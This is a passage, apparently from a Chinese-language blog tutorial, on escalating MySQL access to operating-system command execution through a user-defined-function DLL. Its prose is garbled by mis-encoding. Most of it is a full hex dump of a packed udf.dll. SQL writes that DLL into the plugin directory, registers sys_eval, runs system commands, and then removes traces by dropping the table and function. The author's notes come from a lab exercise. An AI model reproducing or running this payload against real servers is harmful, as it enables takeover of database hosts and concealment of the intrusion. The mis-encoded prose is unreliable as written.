8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 into dumpfile \"C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll\"; æœ¬ä»¥ä¸ºå¯ä»¥é¡ºåˆ©åšä¸‹å»äº†ï¼Œç»“æœç«Ÿç„¶æ²¡æœ‰pluginç›®å½•ï¼Œè¿™é‡Œä¹Ÿå¾ˆç–‘æƒ‘ï¼Œæ˜æ˜cmdæŸ¥è¯¢åˆ°çš„ï¼Œæœäº†ï¼Œè¿™ä¸‹å¾—æ‰‹åŠ¨åˆ›å»ºäº†ï¼ˆæ²¡æœ‰é‚£å‘³å„¿äº†ï¼‰ 5.1.5 åˆ›å»ºä¸€ä¸ªè¡¨å¹¶å°†äºŒè¿›åˆ¶æ•°æ®æ’å…¥åˆ°åå…­è¿›åˆ¶ç¼–ç æµ å¦‚æœåœ¨ä½ç‰ˆæœ¬ç³»ç»Ÿç¯å¢ƒä¸‹ï¼ˆwin2003ï¼‰æˆ–éƒ¨åˆ†ç‰¹æ®Šç¯å¢ƒä½¿ç”¨mysqlå‘½ä»¤æç¤ºç¬¦è¿›è¡Œææƒæ“ä½œï¼Œç”±äºä¸åŒç¯å¢ƒä¸‹çš„mysqlå‘½ä»¤æç¤ºç¬¦å¯è¾“å…¥å­—ç¬¦æœ€å¤§é•¿åº¦ä¸åŒï¼ˆwin2003ä¸º8191ï¼Œwin10ç³»ç»Ÿä¸º65535ï¼‰ï¼Œæ— æ³•ä½¿ç”¨dumpfileä¸€æ¬¡æ€§å†™å…¥å…¨éƒ¨16è¿›åˆ¶å­—ç¬¦ï¼Œåˆ™éœ€è¦å°†udfæ–‡ä»¶çš„16è¿›åˆ¶ç¼–ç å­—ç¬¦å…ˆè¿›è¡Œåˆ‡å‰²ï¼Œå†æ‹¼æ¥å†™å…¥åˆ°ä¸€ä¸ªè¡¨ä¸­ï¼Œæœ€åå¯¼å‡ºåˆ°ç›®æ ‡ç³»ç»Ÿã€‚ æ³¨æ„ï¼šåœ¨è¿›è¡Œ16è¿›åˆ¶æ•°æ®åˆ‡å‰²æ—¶ï¼Œæ¯æ®µå­—ç¬¦çš„é•¿åº¦è¦ä¸º4çš„å€æ•°ï¼Œ2è¿›åˆ¶è½¬ä¸º16è¿›åˆ¶ä½¿ç”¨å–å››åˆä¸€æ³•ï¼Œå¦‚æœä½æ•°ä¸å¤Ÿä¼šåœ¨æœ€é«˜ä½è¡¥0ï¼Œè¡¥0åä¼šç ´ååŸå§‹äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–‡ä»¶ç»“æ„å¯¼è‡´åˆ©ç”¨å¤±è´¥ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¤šäººæ­¤æ–¹æ³•å¤ç°å¤±è´¥çš„åŸå› ã€‚ 5.1.6 éšä¾¿é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“åï¼Œåˆ›å»ºä¸€ä¸ªè¡¨ use test; create table udf(data longblob); è¿™é‡Œæˆ‘æ˜¯æ–°å»ºäº†ä¸€ä¸ªæ•°æ®åº“ 5.1.7 insertæ’å…¥ç¬¬ä¸€æ®µæ•°æ® å½“ç„¶è¿™é‡Œå¦‚æœä½ çš„æ•°æ®é•¿åº¦æ°å¥½çš„è¯ï¼Œç›´æ¥æ’å…¥ä¹Ÿæ˜¯å¯ä»¥çš„ insert into udf(data) values (0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07); 5.1.8 updateæ‹¼æ¥å‰©ä½™æ•°æ® update udf set data = concat(data, 0x031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000); 5.1.9 å¯¼å‡ºè¡¨ä¸­æ•°æ®åˆ°ç³»ç»Ÿç£ç›˜ select data from udf into dumpfile \"C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll\"; åšåˆ°è¿™é‡Œçªç„¶è’™è”½äº†ï¼Œè·Ÿç€æ–‡ç« åšçš„ï¼Œä½†æ˜¯è¿™é‡Œä¼¼ä¹åˆé‡å¤ä¸Šä¼ äº†ä¸€ä¸‹ï¼Œä¸ç†è§£æ˜¯å¹²å˜›çš„ã€‚ æˆ‘è®¤ä¸ºåœ¨5.1.5æ­¥éª¤ä¹‹ååº”è¯¥æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥å°†udfæ–‡ä»¶ä¼ åˆ°pluginç›®å½•ä¸‹çš„æ—¶å€™æ‰€åº”è¯¥æœ‰çš„ï¼Œè€Œè¯¥ä½œè€…åœ¨5.1.5ä¹‹å‰å°±å·²ç»é sqlè¯­å¥å†™å…¥åˆ°äº†pluginç›®å½•ä¸‹ï¼Œåˆ°è¿™å„¿åº”è¯¥å°±æ˜¯æˆåŠŸäº†å§ï¼Œæˆ‘ä¸ç†è§£ä»–çš„å¸ƒå±€äº†ï¼Œä¼°è®¡æ˜¯æ··ä¹±äº† 5.1.3 æŸ¥çœ‹ plugin ç›®å½•ï¼Œä¸å­˜åœ¨ lib\\pluginç›®å½•ä½†æœ‰webshellï¼Œå¯ä½¿ç”¨webshellåˆ›å»ºlib\\pluginç›®å½•ã€‚ 5.1.4 æŸ¥çœ‹ plugin ç›®å½•ï¼Œä¸å­˜åœ¨ lib\\pluginç›®å½•ä¹Ÿæ²¡æœ‰webshellï¼Œæ­¤æ—¶å°±è¦ä½¿ç”¨ç½‘ä¼ ADSæ–‡ä»¶æµåˆ›å»ºç›®å½•çš„æ–¹æ³•äº†ï¼Œä¸Šæ¬¡å¬åˆ°è¿™ä¸ªåè¯è¿˜æ˜¯åœ¨åšupload-labsé¶åœºçš„æ—¶å€™ã€‚ ADSæ–‡ä»¶æµæ˜¯NTFSæ–‡ä»¶ç³»ç»Ÿä¸ºäº†èƒ½ä¸Macç³»ç»Ÿä¸‹çš„HFSæ–‡ä»¶ç³»ç»Ÿå…¼å®¹è€Œè®¾è®¡å‡ºçš„ã€‚ ç»å®è·µåœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹ä½¿ç”¨ADSæ–‡ä»¶æµæ˜¯å¯ä»¥æˆåŠŸåˆ›å»ºç›®å½•æˆ–è€…æ–‡ä»¶åçš„ï¼Œä½†åœ¨ç‹¬ç«‹å®‰è£…çš„mysqlæ•°æ®åº“ç¯å¢ƒä¸phpstudyè‡ªå¸¦mysqlç¯å¢ƒä¸‹å‡åˆ›å»ºå¤±è´¥ï¼Œå¹¶ä¸”æŸ¥é˜…ç½‘ä¸Šå„ç§æ–‡ç« ä¹Ÿéƒ½æ˜¯æ²¡æœ‰åˆ©ç”¨æˆåŠŸçš„ï¼Œä¸¥é‡æ€€ç–‘æ˜¯å“ªä½å°å¯çˆ±è‡†æƒ³å‡ºæ¥çš„ï¼Œä½†ä¸ºäº†æ–‡ç« å®Œæ•´æ€§è¿˜æ˜¯å†³å®šå†™å‡ºæ¥ã€‚ å¯è§æ²¡æœ‰webshellå‡ ä¹ä¸å¯èƒ½äº† echo 123 &gt;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib::$INDEX_ALLOCATION å¦‚ä¸Šå›¾cmdä¸‹æç¤ºåˆ›å»ºlibç›®å½•æˆåŠŸ select \"123\" into dumpfile \"C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib::$INDEX_ALLOCATION\"; æ•°æ®åº“ä¸‹æŠ¥é”™ 5.2 mysqlå°äº5.1ç‰ˆæœ¬æ—¶ï¼š 5.2.1 æœ‰webshellæ—¶ï¼Œé€šè¿‡webshellä¸Šä¼ udfæ–‡ä»¶ã€‚ 5.2.2 æ— webshellæ—¶ï¼Œä½¿ç”¨dumpfileé€šè¿‡16è¿›åˆ¶æ•°æ®æµå†™å…¥udfæ–‡ä»¶ã€‚ 6ã€åˆ›å»ºå‘½ä»¤æ‰§è¡Œå‡½æ•° ä½¿ç”¨winhexæ‰“å¼€udfæ–‡ä»¶ï¼Œåœ¨æœ€ä¸‹æ–¹å¯ä»¥çœ‹åˆ°udfæ–‡ä»¶æä¾›çš„å‡½æ•°ã€‚ sys_evalï¼Œæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶å°†è¾“å‡ºè¿”å›ã€‚ sys_execï¼Œæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶å°†é€€å‡ºç è¿”å›ï¼ˆæ— å‘½ä»¤æ‰§è¡Œç»“æœå›æ˜¾ï¼‰ã€‚ create function sys_eval returns string soname 'udf.dll'; 7ã€å‘½ä»¤æ‰§è¡Œ select sys_eval(\"whoami\"); å¯ä»¥å°†ä¸Šè¿°æ­¥éª¤ç®€å•æ€»ç»“ä¸€ä¸‹ï¼š æ³¨æ„å…ˆæŒ‡å®šæ•°æ®åº“ 1. CREATE TABLE udftmp (c blob); //æ–°å»ºä¸€ä¸ªè¡¨ï¼Œåä¸ºudftmpï¼Œç”¨äºå­˜æ”¾æœ¬åœ°ä¼ æ¥çš„udfæ–‡ä»¶çš„å†…å®¹ã€‚ 2. INSERT INTO udftmp values(unhex('udfæ–‡ä»¶çš„16è¿›åˆ¶æ ¼å¼')); //åœ¨udftmpä¸­å†™å…¥udfæ–‡ä»¶å†…å®¹(udf.txtçš„å†…å®¹) 3. SELECT c FROM udftmp INTO DUMPFILE 'D:\\\\labwork\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll'; //å°†udfæ–‡ä»¶å†…å®¹ä¼ å…¥æ–°å»ºçš„udfæ–‡ä»¶ä¸­ï¼Œè·¯å¾„æ ¹æ®è‡ªå·±çš„@@basedirä¿®æ”¹ //å¯¹äºmysqlå°äº5.1çš„ï¼Œå¯¼å‡ºç›®å½•ä¸ºC:\\Windows\\æˆ–C:\\Windows\\System32\\ 2.6 ç—•è¿¹æ¸…é™¤ 2.6.1 åˆ é™¤è¡¨ drop table udf; 2.6.2 åˆ é™¤å‡½æ•° drop function sys_eval; 2.7 å…¶ä»–é—®é¢˜ 1ã€ERROR 1125 (HY000) Function 'sys_eval' already exists æç¤ºsys_eval å‡½æ•°å·²ç»å­˜åœ¨ï¼Œå¯èƒ½å·²ç»è¢«åˆ©ç”¨è¿‡äº†ï¼Œå°è¯•ç›´æ¥è°ƒç”¨å‡½æ•°ã€‚ è¿™é‡Œå€Ÿç”¨åˆ«äººçš„å›¾è§£äº† 2ã€æç¤ºsys_eval 